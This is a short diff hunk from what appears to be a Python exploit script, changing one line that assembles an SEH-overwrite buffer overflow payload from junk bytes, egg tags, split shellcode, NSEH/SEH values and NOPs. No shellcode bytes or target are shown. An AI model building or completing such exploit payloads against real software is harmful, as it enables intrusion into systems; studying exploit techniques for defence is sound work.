@@ -181,7 +181,7 @@ shellp1 = shellcode[:calcp1]
 shellp2 = shellcode[calcp1:]
 
 # Full payload calculation
-payload = junk + tag + shellp1 + egg2 + nseh + seh + nops + eggh + tag + shellp2
+payload = junk + tag + shellp1 + egg2 + nseh + seh + nops + egg1 + tag + shellp2
 
 
 
